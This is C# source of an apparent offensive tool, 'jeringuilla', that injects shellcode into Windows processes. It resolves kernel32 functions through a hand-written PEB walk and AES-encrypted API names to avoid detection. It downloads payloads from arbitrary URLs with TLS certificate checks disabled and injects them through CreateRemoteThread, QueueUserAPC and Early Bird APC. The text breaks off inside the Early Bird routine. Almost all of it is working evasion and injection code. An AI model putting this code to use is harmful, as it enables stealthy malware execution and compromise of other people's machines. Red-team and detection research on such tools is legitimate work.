using System;
using System.IO;
using System.Linq;
using System.Diagnostics;
using System.Security.Principal;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;


namespace jeringuilla
{
    class Program
    {
        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        // If you change these 2 values you will have to change the AES-encrypted DLL and function names
        static String password = "ricardojoserf   ";
        static String iv = "jeringa jeringa ";
        // If you update these 2 values, update it in payloadEncryptor
        static String payload_aes_password = "ricardojoserf123ricardojoserf123";
        static String payload_aes_iv = "jeringa1jeringa1";

        // [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)] public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
        [DllImport("kernel32.dll", SetLastError = true)] static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        // [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("ntdll.dll", SetLastError = true)] static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref PROCESS_BASIC_INFORMATION pbi, uint processInformationLength, ref uint returnLength);
        private struct PROCESS_BASIC_INFORMATION { public uint ExitStatus; public IntPtr PebBaseAddress; public UIntPtr AffinityMask; public int BasePriority; public UIntPtr UniqueProcessId; public UIntPtr InheritedFromUniqueProcessId; }
        [StructLayout(LayoutKind.Sequential)] public struct IMAGE_DOS_HEADER { public UInt16 e_magic; public UInt16 e_cblp; public UInt16 e_cp; public UInt16 e_crlc; public UInt16 e_cparhdr; public UInt16 e_minalloc; public UInt16 e_maxalloc; public UInt16 e_ss; public UInt16 e_sp; public UInt16 e_csum; public UInt16 e_ip; public UInt16 e_cs; public UInt16 e_lfarlc; public UInt16 e_ovno; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public UInt16[] e_res1; public UInt16 e_oemid; public UInt16 e_oeminfo; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)] public UInt16[] e_res2; public UInt32 e_lfanew; }
        [StructLayout(LayoutKind.Sequential)] public struct IMAGE_NT_HEADERS { public UInt32 Signature; public IMAGE_FILE_HEADER FileHeader; public IMAGE_OPTIONAL_HEADER32 OptionalHeader32; public IMAGE_OPTIONAL_HEADER64 OptionalHeader64; }
        [StructLayout(LayoutKind.Sequential)] public struct IMAGE_FILE_HEADER { public UInt16 Machine; public UInt16 NumberOfSections; public UInt32 TimeDateStamp; public UInt32 PointerToSymbolTable; public UInt32 NumberOfSymbols; public UInt16 SizeOfOptionalHeader; public UInt16 Characteristics; }
        [StructLayout(LayoutKind.Sequential)] public struct IMAGE_OPTIONAL_HEADER32 { public UInt16 Magic; public Byte MajorLinkerVersion; public Byte MinorLinkerVersion; public UInt32 SizeOfCode; public UInt32 SizeOfInitializedData; public UInt32 SizeOfUninitializedData; public UInt32 AddressOfEntryPoint; public UInt32 BaseOfCode; public UInt32 BaseOfData; public UInt32 ImageBase; public UInt32 SectionAlignment; public UInt32 FileAlignment; public UInt16 MajorOperatingSystemVersion; public UInt16 MinorOperatingSystemVersion; public UInt16 MajorImageVersion; public UInt16 MinorImageVersion; public UInt16 MajorSubsystemVersion; public UInt16 MinorSubsystemVersion; public UInt32 Win32VersionValue; public UInt32 SizeOfImage; public UInt32 SizeOfHeaders; public UInt32 CheckSum; public UInt16 Subsystem; public UInt16 DllCharacteristics; public UInt32 SizeOfStackReserve; public UInt32 SizeOfStackCommit; public UInt32 SizeOfHeapReserve; public UInt32 SizeOfHeapCommit; public UInt32 LoaderFlags; public UInt32 NumberOfRvaAndSizes; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)] public IMAGE_DATA_DIRECTORY[] DataDirectory; }
        [StructLayout(LayoutKind.Sequential)] public struct IMAGE_OPTIONAL_HEADER64 { public UInt16 Magic; public Byte MajorLinkerVersion; public Byte MinorLinkerVersion; public UInt32 SizeOfCode; public UInt32 SizeOfInitializedData; public UInt32 SizeOfUninitializedData; public UInt32 AddressOfEntryPoint; public UInt32 BaseOfCode; public UInt64 ImageBase; public UInt32 SectionAlignment; public UInt32 FileAlignment; public UInt16 MajorOperatingSystemVersion; public UInt16 MinorOperatingSystemVersion; public UInt16 MajorImageVersion; public UInt16 MinorImageVersion; public UInt16 MajorSubsystemVersion; public UInt16 MinorSubsystemVersion; public UInt32 Win32VersionValue; public UInt32 SizeOfImage; public UInt32 SizeOfHeaders; public UInt32 CheckSum; public UInt16 Subsystem; public UInt16 DllCharacteristics; public UInt64 SizeOfStackReserve; public UInt64 SizeOfStackCommit; public UInt64 SizeOfHeapReserve; public UInt64 SizeOfHeapCommit; public UInt32 LoaderFlags; public UInt32 NumberOfRvaAndSizes; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)] public IMAGE_DATA_DIRECTORY[] DataDirectory; }
        [StructLayout(LayoutKind.Sequential)] public struct IMAGE_DATA_DIRECTORY { public UInt32 VirtualAddress; public UInt32 Size; }
        [StructLayout(LayoutKind.Sequential)] public struct IMAGE_EXPORT_DIRECTORY { public UInt32 Characteristics; public UInt32 TimeDateStamp; public UInt16 MajorVersion; public UInt16 MinorVersion; public UInt32 Name; public UInt32 Base; public UInt32 NumberOfFunctions; public UInt32 NumberOfNames; public UInt32 AddressOfFunctions; public UInt32 AddressOfNames; public UInt32 AddressOfNameOrdinals; }
        [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO { public int cb; public IntPtr lpReserved; public IntPtr lpDesktop; public IntPtr lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
        [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }

        delegate IntPtr OpenProcessDelegate(uint processAccess, bool bInheritHandle, int processId);
        delegate bool OpenProcessTokenDelegate(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        delegate bool CloseHandleDelegate(IntPtr hObject);
        delegate IntPtr VirtualAllocExDelegate(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        delegate bool WriteProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        delegate IntPtr CreateRemoteThreadDelegate(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        delegate bool CreateProcessDelegate(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        delegate uint QueueUserAPCDelegate(IntPtr pfnAPC, IntPtr hThread, uint dwData);
        delegate uint ResumeThreadDelegate(IntPtr hThread);
        delegate IntPtr OpenThreadDelegate(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);


        private static T MarshalBytesTo<T>(byte[] bytes)
        {
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();
            return theStructure;
        }


        unsafe static IntPtr auxGetModuleHandle(String dll_name)
        {
            IntPtr hProcess = Process.GetCurrentProcess().Handle;
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            uint temp = 0;
            NtQueryInformationProcess(hProcess, 0x0, ref pbi, (uint)(IntPtr.Size * 6), ref temp);
            IntPtr ldr_pointer = (IntPtr)((Int64)pbi.PebBaseAddress + 0x18);
            IntPtr ldr_adress = Marshal.ReadIntPtr(ldr_pointer);
            IntPtr InInitializationOrderModuleList = ldr_adress + 0x30;

            IntPtr next_flink = Marshal.ReadIntPtr(InInitializationOrderModuleList);
            IntPtr dll_base = (IntPtr)1;
            while (dll_base != IntPtr.Zero)
            {
                next_flink = next_flink - 0x10;
                dll_base = Marshal.ReadIntPtr(next_flink + 0x20);
                IntPtr buffer = Marshal.ReadIntPtr(next_flink + 0x50);
                String char_aux = null;
                String base_dll_name = "";
                while (char_aux != "")
                {
                    char_aux = Marshal.PtrToStringAnsi(buffer);
                    buffer += 2;
                    base_dll_name += char_aux;
                }
                next_flink = Marshal.ReadIntPtr(next_flink + 0x10);
                if (dll_name.ToLower() == base_dll_name.ToLower())
                {
                    return dll_base;
                }
            }
            return IntPtr.Zero;
        }


        static IntPtr auxGetProcAddress(IntPtr pDosHdr, String func_name)
        {
            IntPtr hProcess = Process.GetCurrentProcess().Handle;
            byte[] data = new byte[Marshal.SizeOf(typeof(IMAGE_DOS_HEADER))];
            ReadProcessMemory(hProcess, pDosHdr, data, data.Length, out _);

            IMAGE_DOS_HEADER _dosHeader = MarshalBytesTo<IMAGE_DOS_HEADER>(data);
            uint e_lfanew_offset = _dosHeader.e_lfanew;
            IntPtr nthdr = IntPtr.Add(pDosHdr, Convert.ToInt32(e_lfanew_offset));

            byte[] data2 = new byte[Marshal.SizeOf(typeof(IMAGE_NT_HEADERS))];
            ReadProcessMemory(hProcess, nthdr, data2, data2.Length, out _);
            IMAGE_NT_HEADERS _ntHeader = MarshalBytesTo<IMAGE_NT_HEADERS>(data2);
            IMAGE_FILE_HEADER _fileHeader = _ntHeader.FileHeader;

            IntPtr optionalhdr = IntPtr.Add(nthdr, 24);
            byte[] data3 = new byte[Marshal.SizeOf(typeof(IMAGE_OPTIONAL_HEADER64))];
            ReadProcessMemory(hProcess, optionalhdr, data3, data3.Length, out _);
            IMAGE_OPTIONAL_HEADER64 _optionalHeader = MarshalBytesTo<IMAGE_OPTIONAL_HEADER64>(data3);

            int numberDataDirectory = (_fileHeader.SizeOfOptionalHeader / 16) - 1;
            IMAGE_DATA_DIRECTORY[] optionalHeaderDataDirectory = _optionalHeader.DataDirectory;
            uint exportTableRVA = optionalHeaderDataDirectory[0].VirtualAddress;

            if (exportTableRVA != 0)
            {
                IntPtr exportTableAddress = IntPtr.Add(pDosHdr, (int)exportTableRVA);
                byte[] data4 = new byte[Marshal.SizeOf(typeof(IMAGE_EXPORT_DIRECTORY))];
                ReadProcessMemory(hProcess, exportTableAddress, data4, data4.Length, out _);
                IMAGE_EXPORT_DIRECTORY exportTable = MarshalBytesTo<IMAGE_EXPORT_DIRECTORY>(data4);

                UInt32 numberOfNames = exportTable.NumberOfNames;
                UInt32 base_value = exportTable.Base;
                UInt32 addressOfFunctionsVRA = exportTable.AddressOfFunctions;
                UInt32 addressOfNamesVRA = exportTable.AddressOfNames;
                UInt32 addressOfNameOrdinalsVRA = exportTable.AddressOfNameOrdinals;
                IntPtr addressOfFunctionsRA = IntPtr.Add(pDosHdr, (int)addressOfFunctionsVRA);
                IntPtr addressOfNamesRA = IntPtr.Add(pDosHdr, (int)addressOfNamesVRA);
                IntPtr addressOfNameOrdinalsRA = IntPtr.Add(pDosHdr, (int)addressOfNameOrdinalsVRA);

                IntPtr auxaddressOfNamesRA = addressOfNamesRA;
                IntPtr auxaddressOfNameOrdinalsRA = addressOfNameOrdinalsRA;
                IntPtr auxaddressOfFunctionsRA = addressOfFunctionsRA;

                for (int i = 0; i < numberOfNames; i++)
                {
                    byte[] data5 = new byte[Marshal.SizeOf(typeof(UInt32))];
                    ReadProcessMemory(hProcess, auxaddressOfNamesRA, data5, data5.Length, out _);
                    UInt32 functionAddressVRA = MarshalBytesTo<UInt32>(data5);
                    IntPtr functionAddressRA = IntPtr.Add(pDosHdr, (int)functionAddressVRA);
                    byte[] data6 = new byte[func_name.Length];
                    ReadProcessMemory(hProcess, functionAddressRA, data6, data6.Length, out _);
                    String functionName = Encoding.ASCII.GetString(data6);
                    if (functionName == func_name)
                    {
                        // AdddressofNames --> AddressOfNamesOrdinals
                        byte[] data7 = new byte[Marshal.SizeOf(typeof(UInt16))];
                        ReadProcessMemory(hProcess, auxaddressOfNameOrdinalsRA, data7, data7.Length, out _);
                        UInt16 ordinal = MarshalBytesTo<UInt16>(data7);
                        // AddressOfNamesOrdinals --> AddressOfFunctions
                        auxaddressOfFunctionsRA += 4 * ordinal;
                        byte[] data8 = new byte[Marshal.SizeOf(typeof(UInt32))];
                        ReadProcessMemory(hProcess, auxaddressOfFunctionsRA, data8, data8.Length, out _);
                        UInt32 auxaddressOfFunctionsRAVal = MarshalBytesTo<UInt32>(data8);
                        IntPtr functionAddress = IntPtr.Add(pDosHdr, (int)auxaddressOfFunctionsRAVal);
                        return functionAddress;
                    }
                    auxaddressOfNamesRA += 4;
                    auxaddressOfNameOrdinalsRA += 2;
                }
            }
            return IntPtr.Zero;
        }


        static IntPtr helpGetModuleHandle(String dll_name)
        {
            IntPtr dll_base = IntPtr.Zero;
            while (dll_base == IntPtr.Zero)
            {
                dll_base = auxGetModuleHandle(dll_name);
            }
            return dll_base;
        }


        // auxGetProcAddress may fail once if you call it hundreds of times
        static IntPtr helpGetProcAddress(IntPtr dll_handle, String functioname)
        {
            IntPtr functionaddress = IntPtr.Zero;
            while (functionaddress == IntPtr.Zero)
            {
                functionaddress = auxGetProcAddress(dll_handle, functioname);
            }
            return functionaddress;
        }


        static string DecryptStringFromBytes(String cipherTextEncoded, byte[] Key, byte[] IV)
        {
            byte[] cipherText = Convert.FromBase64String(cipherTextEncoded);
            if (cipherText == null || cipherText.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV");
            string plaintext = null;
            using (RijndaelManaged rijAlg = new RijndaelManaged())
            {
                rijAlg.Key = Key;
                rijAlg.IV = IV;
                ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }

            }
            return plaintext;
        }


        private static string getProcessOwner(Process process, IntPtr addrOpenProcessToken, IntPtr addrCloseHandle)
        {
            IntPtr processHandle = IntPtr.Zero;
            try
            {
                OpenProcessTokenDelegate auxOpenProcessToken = (OpenProcessTokenDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenProcessToken, typeof(OpenProcessTokenDelegate));
                auxOpenProcessToken(process.Handle, 8, out processHandle);
                WindowsIdentity wi = new WindowsIdentity(processHandle);
                string user = wi.Name;
                return user;
            }
            catch
            {
                return "N/A";
            }
            finally
            {
                if (processHandle != IntPtr.Zero)
                {                    
                    CloseHandleDelegate auxCloseHandle = (CloseHandleDelegate)Marshal.GetDelegateForFunctionPointer(addrCloseHandle, typeof(CloseHandleDelegate));
                    auxCloseHandle(processHandle);
                }
            }
        }


        static Dictionary<string, string> getProcessPids(String process_name)
        {
            Dictionary<string, string> user_pid = new Dictionary<string, string>();


            String decryptedKernel32 = DecryptStringFromBytes("1GAd1/G7gM4sph/yC0uQLg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedCloseHandle = DecryptStringFromBytes("raaWfwu7TWCs4mgnq8Pytg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            IntPtr k32 = helpGetModuleHandle(decryptedKernel32);
            IntPtr addrCloseHandle = helpGetProcAddress(k32, decryptedCloseHandle);
            String decryptedAdvapi32 = DecryptStringFromBytes("9dOYL40gX4b0hNu/qgaXgA==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedOpenProcessToken = DecryptStringFromBytes("sF3ICi5AMd+hES18ADsvonBk3cp8AKV1ZyuKqaotGS8=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            IntPtr a32 = helpGetModuleHandle(decryptedAdvapi32);
            IntPtr addrOpenProcessToken = helpGetProcAddress(a32, decryptedOpenProcessToken);

            Process[] processCollection = { };
            if (process_name == "all")
            {
                processCollection = Process.GetProcesses();
                foreach (Process targetProcess in processCollection)
                {
                    String processOwner = getProcessOwner(targetProcess, addrOpenProcessToken, addrCloseHandle);
                    String pid = targetProcess.Id.ToString();
                    user_pid.Add(pid, processOwner);
                }
            }
            else
            {
                processCollection = Process.GetProcesses();
                foreach (Process targetProcess in processCollection)
                {
                    String processOwner = getProcessOwner(targetProcess, addrOpenProcessToken, addrCloseHandle);
                    if ((targetProcess.ProcessName.ToLower() == process_name.ToLower()) || (processOwner.ToLower().Contains(process_name.ToLower())))
                    {
                        String pid = targetProcess.Id.ToString();
                        user_pid.Add(pid, processOwner);
                    }
                }
            }

            return user_pid;
        }


        public static byte[] ToByteArray(String hexString)
        {
            byte[] retval = new byte[hexString.Length / 2];
            for (int i = 0; i < hexString.Length; i += 2)
                retval[i / 2] = Convert.ToByte(hexString.Substring(i, 2), 16);
            return retval;
        }


        static byte[] tryToDecryptString(String payload_str)
        {
            try
            {
                String decryptedPayload = DecryptStringFromBytes(payload_str, Encoding.ASCII.GetBytes(payload_aes_password), Encoding.ASCII.GetBytes(payload_aes_iv));
                byte[] decryptedBytes = Convert.FromBase64String(decryptedPayload);
                Console.WriteLine("[+] It was possible to decrypt the payload.");
                return decryptedBytes;
            }
            catch
            {
                // Console.WriteLine("[-] It was not possible to decrypt the payload - Probably not using AES encryption.");
                return ToByteArray(payload_str);
            }
        }


        static byte[] tryToDecryptFile(byte[] encryptedBytes)
        {
            try
            {
                String encryptedPayload = Convert.ToBase64String(encryptedBytes);
                String decryptedPayload = DecryptStringFromBytes(encryptedPayload, Encoding.ASCII.GetBytes(payload_aes_password), Encoding.ASCII.GetBytes(payload_aes_iv));
                byte[] decryptedBytes = Convert.FromBase64String(decryptedPayload);
                Console.WriteLine("[+] It was possible to decrypt the payload.");
                return decryptedBytes;
            }
            catch
            {
                // Console.WriteLine("[-] It was not possible to decrypt the file - Probably not using AES encryption.");
                return encryptedBytes;

            }
        }


        static byte[] getPayload(String payload_str)
        {
            // Payload from standard input
            if (payload_str == null)
            {
                byte[] inputBuffer = new byte[1024];
                Stream inputStream = Console.OpenStandardInput(inputBuffer.Length);
                Console.SetIn(new StreamReader(inputStream, Console.InputEncoding, false, inputBuffer.Length));
                Console.WriteLine("[+] Write hexadecimal payload or url (or Enter to exit):");
                payload_str = Console.ReadLine();
            }

            byte[] buf = { };
            if (payload_str == "")
            {
                Console.WriteLine("[-] Exiting...");
                System.Environment.Exit(0);
            }

            // Payload from url, http or https
            else if (payload_str.Substring(0, 4) == "http")
            {
                Console.WriteLine("[+] Getting payload from url: " + payload_str);
                System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12;
                using (System.Net.WebClient myWebClient = new System.Net.WebClient())
                {
                    try
                    {
                        System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                        buf = myWebClient.DownloadData(payload_str);
                        buf = tryToDecryptFile(buf);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }
                }

            }

            // Hexadecimal payload
            else
            {
                buf = tryToDecryptString(payload_str);
            }

            return buf;
        }


        static void injectShellcodeCreateRemoteThread(String processPID, String payload)
        {
            RijndaelManaged myRijndael = new RijndaelManaged();

            String decryptedKernel32 = DecryptStringFromBytes("1GAd1/G7gM4sph/yC0uQLg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            IntPtr k32 = helpGetModuleHandle(decryptedKernel32);

            String decryptedOpenProcess = DecryptStringFromBytes("ZlWSQ5AeZIU0Z/vLWqlQmw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedVirtualAllocEx = DecryptStringFromBytes("3VykPNLrF3zOBfq50x+yew==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedWriteProcessMemory = DecryptStringFromBytes("/nDO1wIStpfXAWtzJEfxi3MplH2K7Wg0M+ZmtjnkI08=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedCreateRemoteThread = DecryptStringFromBytes("EcLQmi+4wHc4weGwjNgqCQe+1LyC2VMgE3xKs7JyhZY=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));

            IntPtr addrOpenProcess = helpGetProcAddress(k32, decryptedOpenProcess);
            IntPtr addrVirtualAllocEx = helpGetProcAddress(k32, decryptedVirtualAllocEx);
            IntPtr addrWriteProcessMemory = helpGetProcAddress(k32, decryptedWriteProcessMemory);
            IntPtr addrCreateRemoteThread = helpGetProcAddress(k32, decryptedCreateRemoteThread);
       
            OpenProcessDelegate auxOpenProcess = (OpenProcessDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenProcess, typeof(OpenProcessDelegate));
            VirtualAllocExDelegate auxVirtualAllocEx = (VirtualAllocExDelegate)Marshal.GetDelegateForFunctionPointer(addrVirtualAllocEx, typeof(VirtualAllocExDelegate));
            WriteProcessMemoryDelegate auxWriteProcessMemory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(addrWriteProcessMemory, typeof(WriteProcessMemoryDelegate));
            CreateRemoteThreadDelegate auxCreateRemoteThread = (CreateRemoteThreadDelegate)Marshal.GetDelegateForFunctionPointer(addrCreateRemoteThread, typeof(CreateRemoteThreadDelegate));

            byte[] buf = getPayload(payload);

            Process process = Process.GetProcessById(Int32.Parse(processPID));
            String processname = process.ProcessName;
            // String owner = getProcessOwner(process);
            IntPtr hProcess = auxOpenProcess(0x001F0FFF, false, Int32.Parse(processPID));

            if (hProcess != INVALID_HANDLE_VALUE)
            {
                // Console.WriteLine("[+] Handle to process {0} (\"{1}\" owned by \"{2}\") created correctly.", processPID, processname, owner);
                Console.WriteLine("[+] Handle to process {0} (\"{1}\" created correctly.", processPID, processname);
            }
            else
            {
                // Console.WriteLine("[-] Error: Handle to process {0} (\"{1}\" owned by \"{2}\") is NULL.", processPID, processname, owner);
                Console.WriteLine("[-] Error: Handle to process {0} (\"{1}\" is NULL.", processPID, processname);
            }

            IntPtr addr = auxVirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            auxWriteProcessMemory(hProcess, addr, buf, buf.Length, out _);
            IntPtr hThread = auxCreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }


        static void injectShellcodeQueueUserAPC(String processPID, String payload)
        {
            RijndaelManaged myRijndael = new RijndaelManaged();

            String decryptedKernel32 = DecryptStringFromBytes("1GAd1/G7gM4sph/yC0uQLg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            IntPtr k32 = helpGetModuleHandle(decryptedKernel32);

            String decryptedOpenProcess = DecryptStringFromBytes("ZlWSQ5AeZIU0Z/vLWqlQmw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedVirtualAllocEx = DecryptStringFromBytes("3VykPNLrF3zOBfq50x+yew==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedWriteProcessMemory = DecryptStringFromBytes("/nDO1wIStpfXAWtzJEfxi3MplH2K7Wg0M+ZmtjnkI08=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedQueueUserAPC = DecryptStringFromBytes("cd7xBomTOk7mvZ7UxBJDaQ==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedOpenThread = DecryptStringFromBytes("ATZJvFQXpEJm5R5ff90mOA==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));

            IntPtr addrOpenProcess = helpGetProcAddress(k32, decryptedOpenProcess);
            IntPtr addrVirtualAllocEx = helpGetProcAddress(k32, decryptedVirtualAllocEx);
            IntPtr addrWriteProcessMemory = helpGetProcAddress(k32, decryptedWriteProcessMemory);
            IntPtr addrQueueUserAPC = helpGetProcAddress(k32, decryptedQueueUserAPC);
            IntPtr addrOpenThread = helpGetProcAddress(k32, decryptedOpenThread);
            OpenProcessDelegate auxOpenProcess = (OpenProcessDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenProcess, typeof(OpenProcessDelegate));
            VirtualAllocExDelegate auxVirtualAllocEx = (VirtualAllocExDelegate)Marshal.GetDelegateForFunctionPointer(addrVirtualAllocEx, typeof(VirtualAllocExDelegate));
            WriteProcessMemoryDelegate auxWriteProcessMemory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(addrWriteProcessMemory, typeof(WriteProcessMemoryDelegate));
            QueueUserAPCDelegate auxQueueUserAPC = (QueueUserAPCDelegate)Marshal.GetDelegateForFunctionPointer(addrQueueUserAPC, typeof(QueueUserAPCDelegate));
            OpenThreadDelegate auxOpenThread = (OpenThreadDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenThread, typeof(OpenThreadDelegate));

            byte[] buf = getPayload(payload);

            Process process = Process.GetProcessById(Int32.Parse(processPID));
            String processname = process.ProcessName;
            // String owner = getProcessOwner(process);
            IntPtr hProcess = auxOpenProcess(0x001F0FFF, false, Int32.Parse(processPID));

            if (hProcess != INVALID_HANDLE_VALUE)
            {
                // Console.WriteLine("[+] Handle to process {0} (\"{1}\" owned by \"{2}\") created correctly.", processPID, processname, owner);
                Console.WriteLine("[+] Handle to process {0} (\"{1}\" created correctly.", processPID, processname);
            }
            else
            {
                // Console.WriteLine("[-] Error: Handle to process {0} (\"{1}\" owned by \"{2}\") is NULL.", processPID, processname, owner);
                Console.WriteLine("[-] Error: Handle to process {0} (\"{1}\" is NULL.", processPID, processname);
            }

            IntPtr addr = auxVirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x1000, 0x20); // 0x20: PAGE_EXECUTE_READ; 0x1000 = MEM_COMMIT
            auxWriteProcessMemory(hProcess, addr, buf, buf.Length, out _);
            ProcessThread hThread = Process.GetProcessById(Int16.Parse(processPID)).Threads[0];
            IntPtr hThreadId = auxOpenThread(0x0010, false, (uint)hThread.Id);
            auxQueueUserAPC(addr, hThreadId, 0);
        }


        static void injectShellcodeEarlyBird(String processname, String payload)
        {
            RijndaelManaged myRijndael = new RijndaelManaged();

            String decryptedKernel32 = DecryptStringFromBytes("1GAd1/G7gM4sph/yC0uQLg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            IntPtr k32 = helpGetModuleHandle(decryptedKernel32);

            String decryptedCreateProcessA = DecryptStringFromBytes("2FXtT/hu7ZEj8oz79680TQ==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedVirtualAllocEx = DecryptStringFromBytes("3VykPNLrF3zOBfq50x+yew==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedWriteProcessMemory = DecryptStringFromBytes("/nDO1wIStpfXAWtzJEfxi3MplH2K7Wg0M+ZmtjnkI08=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedQueueUserAPC = DecryptStringFromBytes("cd7xBomTOk7mvZ7UxBJDaQ==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedResumeThread = DecryptStringFromBytes("uINo0LSuz3QttywZS2AsBw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));

            IntPtr addrCreateProcess = helpGetProcAddress(k32, decryptedCreateProcessA);
            IntPtr addrVirtualAllocEx = helpGetProcAddress(k32, decryptedVirtualAllocEx);
            IntPtr addrWriteProcessMemory = helpGetProcAddress(k32, decryptedWriteProcessMemory);
            IntPtr addrQueueUserAPC = helpGetProcAddress(k32, decryptedQueueUserAPC);
            IntPtr addrResumeThread = helpGetProcAddress(k32, decryptedResumeThread);
            CreateProcessDelegate auxCreateProcess = (CreateProcessDelegate)Marshal.GetDelegateForFunctionPointer(addrCreateProcess, typeof(CreateProcessDelegate));
            VirtualAllocExDelegate auxVirtualAllocEx = (VirtualAllocExDelegate)Marshal.GetDelegateForFunctionPointer(addrVirtualAllocEx, typeof(VirtualAllocExDelegate));
            WriteProcessMemoryDelegate auxWriteProcessMemory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(addrWriteProcessMemory, typeof(WriteProcessMemoryDelegate));
            QueueUserAPCDelegate auxQueueUserAPC = (QueueUserAPCDelegate)Marshal.GetDelegateForFunctionPointer(addrQueueUserAPC, typeof(QueueUserAPCDelegate));
            ResumeThreadDelegate auxResumeThread = (ResumeThreadDelegate)Marshal.GetDelegateForFunctionPointer(addrResumeThread, typeof(ResumeThreadDelegate));

            byte[] buf = getPayload(payload);

            // https://www.codeproject.com/Articles/230005/Launch-a-process-suspended
            var si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            var pi = new PROCESS_INFORMATION();
            bool success = auxCreateProcess(processname, null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref si, out pi);
            Console.WriteLine("[+] Trying to spawn a suspended process for " + processname);
            if (success)
            {
                Console.WriteLine("[+] Process created correctly");
            }
            else
            {
                Console.WriteLine("[-] Process failed to create");
                System.Environment.Exit(0);
            }

